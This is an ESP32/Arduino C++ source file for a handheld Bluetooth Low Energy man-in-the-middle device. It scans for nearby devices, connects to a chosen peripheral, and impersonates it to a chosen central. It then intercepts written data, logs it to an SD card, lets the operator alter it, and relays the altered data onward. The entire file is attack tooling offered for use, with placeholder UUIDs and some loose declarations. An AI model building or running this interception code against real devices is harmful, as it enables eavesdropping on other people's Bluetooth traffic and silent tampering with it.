#include "BLEMITM.h"
#include <BLEDevice.h>
#include <Adafruit_SSD1306.h>
#include <SD.h>

#define SD_FILE_PATH "/mitm_logs.txt"

extern Adafruit_SSD1306 display;

// Global variables for connections
BLEClient *client;
BLEServer *server;
BLECharacteristic *relayCharacteristic;
std::string interceptedData;

// Device selection variables
String selectedCentral = "";
String selectedPeripheral = "";

// Helper function to scan for devices
std::vector<BLEAdvertisedDevice> scanDevices() {
  std::vector<BLEAdvertisedDevice> devices;

  display.clearDisplay();
  display.setCursor(0, 0);
  display.print("Scanning...");
  display.display();

  BLEScan *scanner = BLEDevice::getScan();
  scanner->setActiveScan(true);
  BLEScanResults results = scanner->start(5, false);

  for (int i = 0; i < results.getCount(); i++) {
    devices.push_back(results.getDevice(i));
  }

  display.clearDisplay();
  display.setCursor(0, 0);
  display.print("Scan Complete.");
  display.display();

  return devices;
}

// UI for selecting a device
String selectDevice(std::vector<BLEAdvertisedDevice> &devices, const char *role) {
  int index = 0;
  bool confirmed = false;

  while (!confirmed) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.print(role);
    display.setCursor(0, 10);
    display.println("Select Device:");

    for (int i = 0; i < devices.size(); i++) {
      if (i == index) {
        display.print("> ");
      } else {
        display.print("  ");
      }
      display.println(devices[i].getAddress().toString().c_str());
    }
    display.display();

    if (digitalRead(BUTTON_UP) == LOW) {
      index = (index - 1 + devices.size()) % devices.size();
      delay(200);
    } else if (digitalRead(BUTTON_DOWN) == LOW) {
      index = (index + 1) % devices.size();
      delay(200);
    } else if (digitalRead(BUTTON_SELECT) == LOW) {
      confirmed = true;
      delay(200);
    }
  }

  return devices[index].getAddress().toString().c_str();
}

// Relaying Data and Logging
class RelayCallbacks : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic *characteristic) {
    interceptedData = characteristic->getValue();

    // Display intercepted data on OLED
    display.clearDisplay();
    display.setCursor(0, 0);
    display.print("Intercepted Data:");
    display.setCursor(0, 10);
    display.print(interceptedData.c_str());
    display.display();

    // Log intercepted data to SD card
    File file = SD.open(SD_FILE_PATH, FILE_APPEND);
    if (file) {
      file.println("Intercepted Data: " + String(interceptedData.c_str()));
      file.close();
    }

    // Modify Data via UI
    String modifiedData = modifyData(interceptedData);

    // Forward modified data to the other device
    if (client && client->isConnected()) {
      BLERemoteCharacteristic *remoteCharacteristic = client->getService("SERVICE_UUID")->getCharacteristic("CHARACTERISTIC_UUID");
      if (remoteCharacteristic && remoteCharacteristic->canWrite()) {
        remoteCharacteristic->writeValue(modifiedData.c_str());
      }
    }
  }
};

// UI for modifying intercepted data
String modifyData(std::string originalData) {
  String newData = String(originalData.c_str());
  int index = 0;
  bool confirmed = false;

  while (!confirmed) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.print("Modify Data:");
    display.setCursor(0, 10);
    display.print(newData);
    display.display();

    if (digitalRead(BUTTON_UP) == LOW) {
      newData[index] = (newData[index] + 1) % 128;  // Increment character
      delay(200);
    } else if (digitalRead(BUTTON_DOWN) == LOW) {
      newData[index] = (newData[index] - 1 + 128) % 128;  // Decrement character
      delay(200);
    } else if (digitalRead(BUTTON_SELECT) == LOW) {
      confirmed = true;
      delay(200);
    }
  }

  return newData;
}

void BLEMITM::start() {
  if (!SD.begin()) {
    Serial.println("SD card initialization failed.");
    return;
  }

  // Scan for devices and select central and peripheral
  std::vector<BLEAdvertisedDevice> devices = scanDevices();
  selectedPeripheral = selectDevice(devices, "Peripheral");
  selectedCentral = selectDevice(devices, "Central");

  // Step 1: Connect to the selected peripheral as a central
  client = BLEDevice::createClient();
  client->connect(BLEAddress(selectedPeripheral.c_str()));
  Serial.println("Connected to Peripheral: " + selectedPeripheral);

  // Step 2: Advertise as a peripheral to the selected central
  server = BLEDevice::createServer();
  BLEService *service = server->createService("SERVICE_UUID");
  relayCharacteristic = service->createCharacteristic(
      "CHARACTERISTIC_UUID",
      BLECharacteristic::PROPERTY_READ | BLECharacteristic::PROPERTY_WRITE);
  relayCharacteristic->setCallbacks(new RelayCallbacks());
  service->start();
  BLEDevice::startAdvertising();
  Serial.println("Advertising to Central: " + selectedCentral);

  // Relay Loop
  while (true) {
    if (client->isConnected() && relayCharacteristic) {
      // Relaying and interception handled by callbacks
    }
    delay(100);
  }
}